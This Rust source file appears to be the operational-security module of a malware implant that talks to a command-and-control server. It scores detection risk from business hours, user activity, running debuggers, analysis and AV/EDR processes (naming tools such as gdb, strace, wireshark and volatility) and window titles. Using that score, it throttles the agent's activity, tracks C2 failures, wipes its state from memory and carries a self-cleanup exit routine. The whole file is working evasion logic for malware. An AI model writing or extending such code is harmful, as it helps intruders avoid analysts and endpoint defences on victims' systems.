use chrono::Datelike;
use log::{debug, warn, info};
use std::sync::Mutex;
use chrono::Timelike;
use once_cell::sync::Lazy;
use serde::{Serialize, Deserialize};
use crate::state::MEMORY_PROTECTOR;
use crate::high_threat_tools::{HIGH_THREAT_ANALYSIS_TOOLS};
use zeroize::Zeroize;

// --- OPSEC Scoring Constants ---
const SCORE_DECAY_FACTOR: f32 = 0.85; // Changed from 0.95 for faster testing
const SCORE_CLAMP_MIN: f32 = 0.0;
const SCORE_CLAMP_MAX: f32 = 100.0;

// Signal Weights
const WEIGHT_HIGH_THREAT_PROCESS: f32 = 40.0;
const WEIGHT_BUSINESS_HOURS: f32 = 2.0;
const WEIGHT_USER_ACTIVE: f32 = 15.0;
const WEIGHT_SUSPICIOUS_WINDOW: f32 = 30.0;
const WEIGHT_C2_UNSTABLE: f32 = 25.0;
const WEIGHT_NOISY_COMMAND_EXECUTION: f32 = 20.0;

// ===  Correlation Bonus Constants ===
const CORRELATION_MULTIPLIER: f32 = 1.5;           // Multiply individual signals when 2+ active
const HIGH_CORRELATION_BONUS: f32 = 25.0;          // Bonus for 3+ signals
const CRITICAL_CORRELATION_BONUS: f32 = 50.0;      // Bonus for 4+ signals

// Specific dangerous combinations
const ANALYST_WORKING_BONUS: f32 = 30.0;           // Analysis tool + user active
const MULTIPLE_THREATS_BONUS: f32 = 20.0;          // Process + window threat

// === DYNAMIC THRESHOLD CONSTANTS ===
const THRESHOLD_ADJUSTMENT_STABLE: f32 = 5.0;       // Increase thresholds when stable
const THRESHOLD_ADJUSTMENT_UNSTABLE: f32 = -8.0;    // Decrease thresholds when unstable
const THRESHOLD_MIN_CLAMP: f32 = 10.0;              // Minimum threshold values
const THRESHOLD_MAX_CLAMP: f32 = 90.0;              // Maximum threshold values

// Hysteresis constants (different thresholds for entering vs exiting)
const HYSTERESIS_BUFFER: f32 = 5.0;                 // Buffer between enter/exit thresholds

// Environment-based threshold modifiers
const BUSINESS_HOURS_MODIFIER: f32 = 10.0;          // Increase thresholds during business hours
const USER_ACTIVE_MODIFIER: f32 = 8.0;              // Increase thresholds when user active
const HIGH_THREAT_MODIFIER: f32 = 15.0;             // Increase thresholds when threats detected

#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
pub struct OpsecState {
    pub mode: AgentMode,
    pub current_score: f32,
    pub consecutive_c2_failures: u32,
    pub dynamic_max_c2_failures: u32,
    pub dynamic_threshold_initialized: bool,
    pub last_noisy_command_time: Option<u64>,
    pub last_transition: u64,
    pub last_c2_threshold_adjustment: u64,
    
    // === ADD THESE MISSING FIELDS ===
    pub dyn_enter_full: f32,           // Score threshold to enter FullOpsec
    pub dyn_exit_full: f32,            // Score threshold to exit FullOpsec
    pub dyn_enter_reduced: f32,        // Score threshold to enter ReducedActivity
    pub dyn_exit_reduced: f32,         // Score threshold to exit ReducedActivity
    pub threshold_adjustment_history: u32, // Track adjustment history for stability
}

//  CRITICAL: Implement Zeroize for OpsecState
impl Zeroize for OpsecState {
    fn zeroize(&mut self) {
        // Zeroize numeric fields
        self.current_score = 0.0;
        self.consecutive_c2_failures = 0;
        self.dynamic_max_c2_failures = 0;
        self.dynamic_threshold_initialized = false;
        self.last_noisy_command_time = None;
        self.last_transition = 0;
        self.last_c2_threshold_adjustment = 0;
        // Zero the new dynamic threshold fields
        self.dyn_enter_full = 0.0;
        self.dyn_exit_full = 0.0;
        self.dyn_enter_reduced = 0.0;
        self.dyn_exit_reduced = 0.0;
        self.threshold_adjustment_history = 0;
        // Ensure mode enum is also cleared
        self.mode = AgentMode::FullOpsec; // Set to safe default
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum OpsecLevel {
    High,
    Low,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AgentMode {
    FullOpsec,
    ReducedActivity,
    BackgroundOpsec
}

#[derive(Debug)]
struct OpsecContext {
    pub is_business_hours: bool,
    pub user_idle_level: OpsecLevel,
    pub high_threat_process_detected: bool,
    pub suspicious_window_detected: bool,
    pub c2_connection_unstable: bool,
}

impl Default for OpsecContext {
    fn default() -> Self {
        Self {
            is_business_hours: false,
            user_idle_level: OpsecLevel::Low,
            high_threat_process_detected: false,
            suspicious_window_detected: false,
            c2_connection_unstable: false,
        }
    }
}

//  Helper function to get current timestamp
fn now_timestamp() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

//  Helper function to check if timestamp is within duration
fn timestamp_elapsed_secs(timestamp: u64) -> u64 {
    let now = now_timestamp();
    now.saturating_sub(timestamp)
}

// MAKE these functions PUBLIC for use in command_shell.rs
pub fn with_opsec_state<F, R>(accessor: F) -> R 
where F: Fn(&OpsecState) -> R,
{
    let protector = MEMORY_PROTECTOR.lock().unwrap();
    match protector.with_opsec_state(&accessor) {
        Ok(result) => result,
        Err(_) => {
            // Use config for proper default state
            let config = crate::config::AgentConfig::load().unwrap_or_default();
            let default_state = create_default_opsec_state(&config);
            accessor(&default_state)
        }
    }
}

pub fn with_opsec_state_mut<F, R>(updater: F) -> R 
where F: Fn(&mut OpsecState) -> R,
{
    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
    match protector.with_opsec_state_mut(&updater) {
        Ok(result) => result,
        Err(_) => {
            // Use config for proper default state
            let config = crate::config::AgentConfig::load().unwrap_or_default();
            let mut default_state = create_default_opsec_state(&config);
            let result = updater(&mut default_state);
            // Try to store the updated state (ignore errors)
            let _ = protector.encrypt_opsec_state(&default_state);
            result
        }
    }
}

pub fn determine_agent_mode(config: &crate::config::AgentConfig) -> AgentMode {
    with_opsec_state_mut(|opsec_state| {
        adjust_c2_failure_threshold(opsec_state, config);
    });

    let mut context = OpsecContext::default();
    context.is_business_hours = check_business_hours();
    context.user_idle_level = check_idle_level();
    context.suspicious_window_detected = check_window_state();
    context.c2_connection_unstable = check_c2_stability();

    let current_score = with_opsec_state(|state| state.current_score);

    let mut base_interval = config.proc_scan_interval_secs;
    if context.is_business_hours { base_interval = base_interval.min(120); }
    if current_score > 75.0 { base_interval = base_interval.min(30); }
    else if current_score > 40.0 { base_interval = base_interval.min(60); }
    if context.user_idle_level == OpsecLevel::Low { base_interval = base_interval.max(300); }

    let jitter = rand::random::<u64>() % 61;
    let adaptive_interval = base_interval + jitter;
    debug!(
        "[OPSEC INTERVAL] Adaptive Interval: {}s (Base: {}, Jitter: {}, Score: {:.1}, Idle: {:?})",
        adaptive_interval, config.proc_scan_interval_secs, jitter, current_score, context.user_idle_level
    );

    context.high_threat_process_detected = check_proc_state(adaptive_interval);

    with_opsec_state_mut(|opsec_state| {
        update_opsec_score_and_mode(opsec_state, &context, config)
    })
}

fn update_opsec_score_and_mode(
    opsec_state: &mut OpsecState,
    context: &OpsecContext,
    config: &crate::config::AgentConfig
) -> AgentMode {
    // 1. Initialize dynamic thresholds if needed
    if !opsec_state.dynamic_threshold_initialized {
        opsec_state.dyn_enter_full = config.base_score_threshold_reduced_to_full;
        opsec_state.dyn_exit_full = config.base_score_threshold_reduced_to_full - HYSTERESIS_BUFFER;
        opsec_state.dyn_enter_reduced = config.base_score_threshold_bg_to_reduced;
        opsec_state.dyn_exit_reduced = config.base_score_threshold_bg_to_reduced - HYSTERESIS_BUFFER;
        opsec_state.dynamic_threshold_initialized = true;
        info!("[OPSEC DYNAMIC] Initialized thresholds: Enter/Exit Full: {:.1}/{:.1}, Enter/Exit Reduced: {:.1}/{:.1}",
              opsec_state.dyn_enter_full, opsec_state.dyn_exit_full, 
              opsec_state.dyn_enter_reduced, opsec_state.dyn_exit_reduced);
    }

    // 2. Adjust dynamic thresholds based on environment
    adjust_dynamic_thresholds(opsec_state, context, config);

    // 3. Apply score decay
    opsec_state.current_score *= SCORE_DECAY_FACTOR;

    // 4. ===  Calculate correlation bonuses FIRST ===
    let (correlation_multiplier, correlation_bonus) = calculate_correlation_bonus(context, opsec_state);

    // 5. Add weighted contributions WITH correlation multiplier
    let mut score_increase: f32 = 0.0;
    let user_is_active = context.user_idle_level == OpsecLevel::High;
    
    if context.is_business_hours {
        let weight = WEIGHT_BUSINESS_HOURS * correlation_multiplier;
        score_increase += weight;
        debug!("[OPSEC] Business hours: +{:.1} (×{:.1})", weight, correlation_multiplier);
    }
    if user_is_active {
        let weight = WEIGHT_USER_ACTIVE * correlation_multiplier;
        score_increase += weight;
        debug!("[OPSEC] User active: +{:.1} (×{:.1})", weight, correlation_multiplier);
    }
    if context.high_threat_process_detected {
        let weight = WEIGHT_HIGH_THREAT_PROCESS * correlation_multiplier;
        score_increase += weight;
        warn!("[OPSEC] Threat process: +{:.1} (×{:.1})", weight, correlation_multiplier);
    }
    if context.suspicious_window_detected {
        let weight = WEIGHT_SUSPICIOUS_WINDOW * correlation_multiplier;
        score_increase += weight;
        warn!("[OPSEC] Suspicious window: +{:.1} (×{:.1})", weight, correlation_multiplier);
    }
    if context.c2_connection_unstable {
        let weight = WEIGHT_C2_UNSTABLE * correlation_multiplier;
        score_increase += weight;
        warn!("[OPSEC] C2 unstable: +{:.1} (×{:.1})", weight, correlation_multiplier);
    }
    
    // Check for recent noisy command execution
    if let Some(last_noisy) = opsec_state.last_noisy_command_time {
        let time_since_noisy = timestamp_elapsed_secs(last_noisy);
        if time_since_noisy < 300 {
            let weight = WEIGHT_NOISY_COMMAND_EXECUTION * correlation_multiplier;
            score_increase += weight;
            debug!("[OPSEC] Noisy command: +{:.1} (×{:.1})", weight, correlation_multiplier);
        }
    }

    // 6. Add correlation bonus on top
    score_increase += correlation_bonus;
    if correlation_bonus > 0.0 {
        warn!("[OPSEC CORRELATION] Total correlation bonus: +{:.1}", correlation_bonus);
    }

    let old_score = opsec_state.current_score;
    opsec_state.current_score += score_increase;
    opsec_state.current_score = opsec_state.current_score.clamp(SCORE_CLAMP_MIN, SCORE_CLAMP_MAX);

    if score_increase > 0.0 {
        debug!("[OPSEC] Score updated: {:.1} -> {:.1} (+{:.1})", old_score, opsec_state.current_score, score_increase);
    }

    // 5. Determine new mode using DYNAMIC THRESHOLDS with HYSTERESIS
    let current_score = opsec_state.current_score;
    let current_mode = opsec_state.mode;
    
    let desired_mode = match current_mode {
        AgentMode::FullOpsec => {
            // From FullOpsec: use EXIT thresholds (lower, easier to exit)
            if current_score < opsec_state.dyn_exit_reduced {
                AgentMode::BackgroundOpsec
            } else if current_score < opsec_state.dyn_exit_full {
                AgentMode::ReducedActivity
            } else {
                AgentMode::FullOpsec // Stay in FullOpsec
            }
        }
        AgentMode::ReducedActivity => {
            // From ReducedActivity: use appropriate thresholds
            if current_score >= opsec_state.dyn_enter_full {
                AgentMode::FullOpsec
            } else if current_score < opsec_state.dyn_exit_reduced {
                AgentMode::BackgroundOpsec
            } else {
                AgentMode::ReducedActivity // Stay in ReducedActivity
            }
        }
        AgentMode::BackgroundOpsec => {
            // From BackgroundOpsec: use ENTER thresholds (higher, harder to enter)
            if current_score >= opsec_state.dyn_enter_full {
                AgentMode::FullOpsec
            } else if current_score >= opsec_state.dyn_enter_reduced {
                AgentMode::ReducedActivity
            } else {
                AgentMode::BackgroundOpsec // Stay in BackgroundOpsec
            }
        }
    };

    debug!("[OPSEC DYNAMIC] Mode determination: Score: {:.1}, Current: {:?}, Thresholds: Enter(R:{:.1},F:{:.1}) Exit(R:{:.1},F:{:.1}) -> Desired: {:?}",
           current_score, current_mode, 
           opsec_state.dyn_enter_reduced, opsec_state.dyn_enter_full,
           opsec_state.dyn_exit_reduced, opsec_state.dyn_exit_full,
           desired_mode);

    // 6. Cool-down period check (existing logic)
    let time_since_transition = timestamp_elapsed_secs(opsec_state.last_transition);
    
    let min_duration = match opsec_state.mode {
        AgentMode::FullOpsec => config.min_duration_full_opsec_secs,
        AgentMode::ReducedActivity => config.min_duration_reduced_activity_secs,
        AgentMode::BackgroundOpsec => config.min_duration_background_opsec_secs,
    };

    if desired_mode != opsec_state.mode && time_since_transition < min_duration {
        debug!(
            "[OPSEC] Mode transition blocked by cool-down period: {:?} -> {:?} blocked ({}/{}s remaining)", 
            opsec_state.mode, desired_mode, min_duration - time_since_transition, min_duration
        );
        return opsec_state.mode; // Stay in current mode
    }

    // 7. Handle mode transitions
    if desired_mode != opsec_state.mode {
        info!(
            "[OPSEC DYNAMIC] Mode transition: {:?} -> {:?} (Score: {:.1}, Thresholds: R:{:.1}/{:.1}, F:{:.1}/{:.1})", 
            opsec_state.mode, desired_mode, opsec_state.current_score,
            opsec_state.dyn_enter_reduced, opsec_state.dyn_exit_reduced,
            opsec_state.dyn_enter_full, opsec_state.dyn_exit_full
        );
        opsec_state.mode = desired_mode;
        opsec_state.last_transition = now_timestamp();
    }

    opsec_state.mode
}

pub fn perform_self_cleanup() -> ! {
    warn!("[OPSEC] Performing self-cleanup due to high threat detection");
    std::process::exit(0);
}

fn check_business_hours() -> bool {
    let now = chrono::Local::now();
    let hour = now.hour();
    let weekday = now.weekday();
    
    // Monday=1 to Friday=5, 9 AM to 5 PM
    matches!(weekday.number_from_monday(), 1..=5) && (9..=17).contains(&hour)
}

#[cfg(target_os = "windows")]
fn check_idle_level() -> OpsecLevel {
    use crate::win_api_hiding::get_last_input_info;
    use winapi::um::winuser::LASTINPUTINFO;
    use winapi::um::sysinfoapi::GetTickCount;
    use std::mem;

    unsafe {
        let mut last_input_info: LASTINPUTINFO = mem::zeroed();
        last_input_info.cbSize = mem::size_of::<LASTINPUTINFO>() as u32;
        
        if get_last_input_info(&mut last_input_info) != 0 {
            let current_tick = GetTickCount();
            let idle_time_ms = current_tick.saturating_sub(last_input_info.dwTime);
            let idle_time_secs = idle_time_ms / 1000;
            
            // Consider user active if input within last 60 seconds
            if idle_time_secs < 60 {
                debug!("[OPSEC] User active (idle for {}s)", idle_time_secs);
                OpsecLevel::High // User is active
            } else {
                debug!("[OPSEC] User idle (idle for {}s)", idle_time_secs);
                OpsecLevel::Low // User is idle
            }
        } else {
            warn!("[OPSEC] Failed to get last input info, assuming user active");
            OpsecLevel::High // Fail safe - assume active
        }
    }
}

#[cfg(not(target_os = "windows"))]
fn check_idle_level() -> OpsecLevel {
    // For non-Windows, use a simple process-based heuristic
    use std::process::Command;
    
    // Check if there are active user processes (simplified)
    match Command::new("who").output() {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            if output_str.trim().is_empty() {
                debug!("[OPSEC] No active users detected (Linux)");
                OpsecLevel::Low
            } else {
                debug!("[OPSEC] Active users detected (Linux)");
                OpsecLevel::High
            }
        }
        Err(_) => {
            // Fallback: assume user is active for safety
            debug!("[OPSEC] Could not check user activity, assuming active");
            OpsecLevel::High
        }
    }
}

// FIX: Use timestamp-based cache instead of Instant to avoid Windows overflow
static PROC_SCAN_CACHE: Lazy<Mutex<(u64, bool)>> = Lazy::new(|| Mutex::new((0, false)));

#[cfg(target_os = "windows")]
pub fn check_proc_state(proc_scan_interval: u64) -> bool {
    let mut cache = PROC_SCAN_CACHE.lock().unwrap();
    let (last_scan, last_result) = *cache;
    
    let now = now_timestamp();
    if now.saturating_sub(last_scan) < proc_scan_interval {
        debug!("[OPSEC] Using cached process scan result: {}", last_result);
        return last_result;
    }

    debug!("[OPSEC] Performing fresh process scan...");
    let mut threat_detected = false;
    let mut threat_count = 0;
    
    // Get running processes using sysinfo
    use sysinfo::{System, RefreshKind, ProcessRefreshKind, ProcessesToUpdate};
    
    let mut sys = System::new_with_specifics(
        RefreshKind::everything().with_processes(ProcessRefreshKind::everything())
    );
    sys.refresh_processes(ProcessesToUpdate::All, true);
    
    // Check each running process
    for (pid, process) in sys.processes() {
        let process_name = process.name().to_string_lossy().to_lowercase();
        
        // Check against high threat analysis tools
        for threat in HIGH_THREAT_ANALYSIS_TOOLS.iter() {
            if process_name.contains(&threat.to_lowercase()) {
                warn!("[OPSEC] HIGH THREAT ANALYSIS TOOL DETECTED: {} (PID: {})", process.name().to_string_lossy(), pid);
                threat_detected = true;
                threat_count += 1;
                
                // Immediate escalation for certain critical tools
                if threat.contains("ida") || threat.contains("x64dbg") || threat.contains("x32dbg") {
                    warn!("[OPSEC] CRITICAL ANALYSIS TOOL DETECTED - IMMEDIATE THREAT!");
                    // Could trigger self-cleanup here if desired
                    // crate::opsec::perform_self_cleanup();
                }
                break;
            }
        }
        
        // Check against AV/EDR processes
        for av_process in COMMON_AV_EDR_PROCESSES.iter() {
            if process_name.contains(&av_process.to_lowercase()) {
                info!("[OPSEC] AV/EDR process detected: {} (PID: {})", process.name().to_string_lossy(), pid);
                // AV/EDR detection increases suspicion but isn't immediately critical
                break;
            }
        }
    }
    
    if threat_detected {
        warn!("[OPSEC] THREAT SCAN COMPLETE: {} threat process(es) detected", threat_count);
    } else {
        debug!("[OPSEC] Process scan complete: No threat processes detected");
    }
    
    *cache = (now, threat_detected);
    threat_detected
}

#[cfg(not(target_os = "windows"))]
pub fn check_proc_state(proc_scan_interval: u64) -> bool {
    let mut cache = PROC_SCAN_CACHE.lock().unwrap();
    let (last_scan, last_result) = *cache;
    
    let now = now_timestamp();
    if now.saturating_sub(last_scan) < proc_scan_interval {
        debug!("[OPSEC] Using cached process scan result: {}", last_result);
        return last_result;
    }

    debug!("[OPSEC] Performing fresh process scan (Linux)...");
    let mut threat_detected = false;
    
    // Get running processes using sysinfo
    use sysinfo::{System, RefreshKind, ProcessRefreshKind, ProcessesToUpdate};
    
    let mut sys = System::new_with_specifics(
        RefreshKind::everything().with_processes(ProcessRefreshKind::everything())
    );
    sys.refresh_processes(ProcessesToUpdate::All, true);
    
    // Check each running process
    for (pid, process) in sys.processes() {
        let process_name = process.name().to_string_lossy().to_lowercase();
        
        // Check against high threat analysis tools (Linux versions)
        for threat in HIGH_THREAT_ANALYSIS_TOOLS.iter() {
            let linux_threat = threat.replace(".exe", ""); // Remove .exe for Linux
            if process_name.contains(&linux_threat.to_lowercase()) {
                warn!("[OPSEC] THREAT ANALYSIS TOOL DETECTED: {} (PID: {})", process.name().to_string_lossy(), pid);
                threat_detected = true;
                break;
            }
        }
        
        // Additional Linux-specific tools
        let linux_threats = [
            "gdb", "strace", "ltrace", "objdump", "readelf", "hexdump", "xxd",
            "wireshark", "tshark", "tcpdump", "netstat", "ss", "lsof",
            "volatility", "bulk_extractor", "foremost", "binwalk"
        ];
        
        for &linux_threat in &linux_threats {
            if process_name.contains(linux_threat) {
                warn!("[OPSEC] Linux analysis tool detected: {} (PID: {})", process.name().to_string_lossy(), pid);
                threat_detected = true;
                break;
            }
        }
    }
    
    if !threat_detected {
        debug!("[OPSEC] Process scan complete: No threat processes detected");
    }
    
    *cache = (now, threat_detected);
    threat_detected
}

// WINDOW TITLE SCANNING IMPLEMENTATION
#[cfg(target_os = "windows")]
fn check_window_state() -> bool {
    use crate::win_api_hiding::{get_foreground_window, get_window_text_w};
    use std::ptr;
    
    unsafe {
        let hwnd = get_foreground_window();
        if hwnd.is_null() {
            debug!("[OPSEC] No foreground window");
            return false;
        }
        
        let mut buffer = [0u16; 512];
        let len = get_window_text_w(hwnd, buffer.as_mut_ptr(), buffer.len() as i32);
        
        if len > 0 {
            let window_title = String::from_utf16_lossy(&buffer[..len as usize]);
            debug!("[OPSEC] Checking window title: '{}'", window_title);
            
            // Check against suspicious window titles
            for suspicious_title in SUSPICIOUS_WINDOW_TITLES.iter() {
                if window_title.to_lowercase().contains(&suspicious_title.to_lowercase()) {
                    warn!("[OPSEC] SUSPICIOUS WINDOW DETECTED: '{}'", window_title);
                    return true;
                }
            }
            
            debug!("[OPSEC] Window title check passed: '{}'", window_title);
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn check_window_state() -> bool {
    // Linux window checking would require X11 libraries
    // For now, simplified implementation
    debug!("[OPSEC] Window checking not implemented for this platform");
    false
}

// === UPDATED: Default state creation with dynamic thresholds ===
fn create_default_opsec_state(config: &crate::config::AgentConfig) -> crate::opsec::OpsecState {
    crate::opsec::OpsecState {
        mode: crate::opsec::AgentMode::FullOpsec,
        current_score: 100.0,
        consecutive_c2_failures: 0,
        dynamic_max_c2_failures: config.base_max_consecutive_c2_failures,
        dynamic_threshold_initialized: false,
        last_noisy_command_time: None,
        last_transition: now_timestamp(),
        last_c2_threshold_adjustment: now_timestamp(),
        // Initialize dynamic thresholds from config
        dyn_enter_full: config.base_score_threshold_reduced_to_full,
        dyn_exit_full: config.base_score_threshold_reduced_to_full - HYSTERESIS_BUFFER,
        dyn_enter_reduced: config.base_score_threshold_bg_to_reduced,
        dyn_exit_reduced: config.base_score_threshold_bg_to_reduced - HYSTERESIS_BUFFER,
        threshold_adjustment_history: 0,
    }
}

// ===  Dynamic Threshold Adjustment System ===
fn adjust_dynamic_thresholds(
    opsec_state: &mut OpsecState,
    context: &OpsecContext,
    config: &crate::config::AgentConfig,
) {
    // Check if enough time has passed since last adjustment
    let adjustment_interval = config.c2_threshold_adjust_interval_secs;
    if timestamp_elapsed_secs(opsec_state.last_c2_threshold_adjustment) < adjustment_interval {
        return;
    }

    info!("[OPSEC DYNAMIC] Starting threshold adjustment cycle");

    // Calculate environment-based modifiers
    let mut stability_modifier = 0.0;
    let mut instability_modifier = 0.0;

    // === STABILITY FACTORS (increase thresholds) ===
    if context.user_idle_level == OpsecLevel::Low {
        stability_modifier += USER_ACTIVE_MODIFIER;
        debug!("[OPSEC DYNAMIC] User idle detected: +{}", USER_ACTIVE_MODIFIER);
    }

    if !context.is_business_hours {
        stability_modifier += BUSINESS_HOURS_MODIFIER;
        debug!("[OPSEC DYNAMIC] Off-hours detected: +{}", BUSINESS_HOURS_MODIFIER);
    }

    if opsec_state.consecutive_c2_failures == 0 {
        stability_modifier += THRESHOLD_ADJUSTMENT_STABLE;
        debug!("[OPSEC DYNAMIC] C2 stable: +{}", THRESHOLD_ADJUSTMENT_STABLE);
    }

    // === INSTABILITY FACTORS (decrease thresholds) ===
    if context.is_business_hours {
        instability_modifier += BUSINESS_HOURS_MODIFIER;
        debug!("[OPSEC DYNAMIC] Business hours detected: -{}", BUSINESS_HOURS_MODIFIER);
    }

    if context.user_idle_level == OpsecLevel::High {
        instability_modifier += USER_ACTIVE_MODIFIER;
        debug!("[OPSEC DYNAMIC] User active detected: -{}", USER_ACTIVE_MODIFIER);
    }

    if context.high_threat_process_detected || context.suspicious_window_detected {
        instability_modifier += HIGH_THREAT_MODIFIER;
        debug!("[OPSEC DYNAMIC] Threat detected: -{}", HIGH_THREAT_MODIFIER);
    }

    if opsec_state.consecutive_c2_failures > 0 {
        instability_modifier += THRESHOLD_ADJUSTMENT_UNSTABLE.abs();
        debug!("[OPSEC DYNAMIC] C2 failures detected: -{}", THRESHOLD_ADJUSTMENT_UNSTABLE.abs());
    }

    // Calculate net adjustment
    let net_adjustment = stability_modifier - instability_modifier;
    
    // Apply adjustment with exponential smoothing for stability
    let smoothing_factor = 0.3; // Dampen rapid changes
    let adjusted_change = net_adjustment * smoothing_factor;

    // Store old values for logging
    let old_enter_full = opsec_state.dyn_enter_full;
    let old_exit_full = opsec_state.dyn_exit_full;
    let old_enter_reduced = opsec_state.dyn_enter_reduced;
    let old_exit_reduced = opsec_state.dyn_exit_reduced;

    // Apply adjustments with clamping
    opsec_state.dyn_enter_full = (opsec_state.dyn_enter_full + adjusted_change)
        .clamp(THRESHOLD_MIN_CLAMP, THRESHOLD_MAX_CLAMP);
    opsec_state.dyn_exit_full = (opsec_state.dyn_exit_full + adjusted_change)
        .clamp(THRESHOLD_MIN_CLAMP, THRESHOLD_MAX_CLAMP);
    opsec_state.dyn_enter_reduced = (opsec_state.dyn_enter_reduced + adjusted_change)
        .clamp(THRESHOLD_MIN_CLAMP, THRESHOLD_MAX_CLAMP);
    opsec_state.dyn_exit_reduced = (opsec_state.dyn_exit_reduced + adjusted_change)
        .clamp(THRESHOLD_MIN_CLAMP, THRESHOLD_MAX_CLAMP);

    // === CRITICAL: Ensure hysteresis is maintained ===
    opsec_state.dyn_exit_full = opsec_state.dyn_exit_full.min(opsec_state.dyn_enter_full - HYSTERESIS_BUFFER);
    opsec_state.dyn_exit_reduced = opsec_state.dyn_exit_reduced.min(opsec_state.dyn_enter_reduced - HYSTERESIS_BUFFER);

    // Ensure logical ordering: reduced thresholds < full thresholds
    if opsec_state.dyn_enter_reduced >= opsec_state.dyn_enter_full {
        opsec_state.dyn_enter_reduced = opsec_state.dyn_enter_full - 10.0;
        opsec_state.dyn_exit_reduced = opsec_state.dyn_enter_reduced - HYSTERESIS_BUFFER;
    }

    // Update adjustment timestamp and history
    opsec_state.last_c2_threshold_adjustment = now_timestamp();
    opsec_state.threshold_adjustment_history = opsec_state.threshold_adjustment_history.saturating_add(1);

    // Log changes if significant
    if (opsec_state.dyn_enter_full - old_enter_full).abs() > 1.0 {
        info!(
            "[OPSEC DYNAMIC] Threshold adjustment #{}: Enter/Exit Full: {:.1}/{:.1} -> {:.1}/{:.1}, Enter/Exit Reduced: {:.1}/{:.1} -> {:.1}/{:.1} (net: {:.1})",
            opsec_state.threshold_adjustment_history,
            old_enter_full, old_exit_full, opsec_state.dyn_enter_full, opsec_state.dyn_exit_full,
            old_enter_reduced, old_exit_reduced, opsec_state.dyn_enter_reduced, opsec_state.dyn_exit_reduced,
            adjusted_change
        );
    } else {
        debug!("[OPSEC DYNAMIC] Threshold adjustment #{}: No significant change (net: {:.1})", 
               opsec_state.threshold_adjustment_history, adjusted_change);
    }
}

// Add the missing correlation bonus function:
fn calculate_correlation_bonus(context: &OpsecContext, opsec_state: &OpsecState) -> (f32, f32) {
    // Count active signals
    let mut active_count = 0;
    let mut correlation_bonus = 0.0;
    
    if context.is_business_hours { active_count += 1; }
    if context.user_idle_level == OpsecLevel::High { active_count += 1; }
    if context.high_threat_process_detected { active_count += 1; }
    if context.suspicious_window_detected { active_count += 1; }
    if context.c2_connection_unstable { active_count += 1; }
    
    // Recent noisy command
    if let Some(last_noisy) = opsec_state.last_noisy_command_time {
        if timestamp_elapsed_secs(last_noisy) < 300 {
            active_count += 1;
        }
    }
    
    // Specific high-risk combinations
    if context.high_threat_process_detected && context.user_idle_level == OpsecLevel::High {
        correlation_bonus += ANALYST_WORKING_BONUS;
        warn!("[OPSEC CORRELATION] CRITICAL: Analysis tool + active user! (+{})", ANALYST_WORKING_BONUS);
    }
    
    if context.high_threat_process_detected && context.suspicious_window_detected {
        correlation_bonus += MULTIPLE_THREATS_BONUS;
        warn!("[OPSEC CORRELATION] Multiple analysis threats detected! (+{})", MULTIPLE_THREATS_BONUS);
    }
    
    // General correlation bonuses
    if active_count >= 4 {
        correlation_bonus += CRITICAL_CORRELATION_BONUS;
        warn!("[OPSEC CORRELATION] CRITICAL: {} signals active! (+{})", active_count, CRITICAL_CORRELATION_BONUS);
    } else if active_count >= 3 {
        correlation_bonus += HIGH_CORRELATION_BONUS;
        warn!("[OPSEC CORRELATION] High correlation: {} signals (+{})", active_count, HIGH_CORRELATION_BONUS);
    }
    
    // Return multiplier and bonus
    let multiplier = if active_count >= 2 { CORRELATION_MULTIPLIER } else { 1.0 };
    (multiplier, correlation_bonus)
}

// Add the missing C2 stability function:
fn check_c2_stability() -> bool {
    with_opsec_state(|state| {
        // Consider C2 unstable if we have consecutive failures
        if state.consecutive_c2_failures > 0 {
            debug!("[OPSEC] C2 connection unstable: {} consecutive failures", state.consecutive_c2_failures);
            true
        } else {
            debug!("[OPSEC] C2 connection stable");
            false
        }
    })
}

// Add the missing C2 threshold adjustment function:
fn adjust_c2_failure_threshold(
    opsec_state: &mut OpsecState,
    config: &crate::config::AgentConfig,
) {
    // Adjust the dynamic threshold based on current consecutive failures
    let base_threshold = config.base_max_consecutive_c2_failures;
    
    if opsec_state.consecutive_c2_failures > 0 {
        // We have failures - consider decreasing threshold (more sensitive)
        let decrease_factor = config.c2_failure_threshold_decrease_factor;
        let new_threshold = ((opsec_state.dynamic_max_c2_failures as f32) * decrease_factor) as u32;
        opsec_state.dynamic_max_c2_failures = new_threshold.max(1); // At least 1
        debug!("[OPSEC] C2 threshold decreased to {} due to failures", opsec_state.dynamic_max_c2_failures);
    } else {
        // No recent failures - consider increasing threshold (less sensitive)
        let increase_factor = config.c2_failure_threshold_increase_factor;
        let max_multiplier = config.c2_dynamic_threshold_max_multiplier;
        let max_allowed = ((base_threshold as f32) * max_multiplier) as u32;
        
        let new_threshold = ((opsec_state.dynamic_max_c2_failures as f32) * increase_factor) as u32;
        opsec_state.dynamic_max_c2_failures = new_threshold.min(max_allowed);
        debug!("[OPSEC] C2 threshold adjusted to {} (stable connection)", opsec_state.dynamic_max_c2_failures);
    }
}

/// Called when C2 communication fails
pub fn record_c2_failure() {
    with_opsec_state_mut(|state| {
        state.consecutive_c2_failures = state.consecutive_c2_failures.saturating_add(1);
        warn!("[OPSEC] C2 failure recorded: {} consecutive failures", state.consecutive_c2_failures);
        
        // Check if we've exceeded the dynamic threshold
        if state.consecutive_c2_failures >= state.dynamic_max_c2_failures {
            warn!("[OPSEC] C2 failure threshold exceeded: {}/{}", 
                  state.consecutive_c2_failures, state.dynamic_max_c2_failures);
        }
    });
}

/// Called when C2 communication succeeds
pub fn record_c2_success() {
    with_opsec_state_mut(|state| {
        if state.consecutive_c2_failures > 0 {
            info!("[OPSEC] C2 connection restored after {} failures", state.consecutive_c2_failures);
            state.consecutive_c2_failures = 0;
        }
    });
}

/// Called when executing noisy commands
pub fn record_noisy_command() {
    with_opsec_state_mut(|state| {
        state.last_noisy_command_time = Some(now_timestamp());
        debug!("[OPSEC] Noisy command execution recorded");
    });
}

/// Check if C2 failures have exceeded threshold
pub fn c2_failures_exceeded() -> bool {
    with_opsec_state(|state| {
        state.consecutive_c2_failures >= state.dynamic_max_c2_failures
    })
}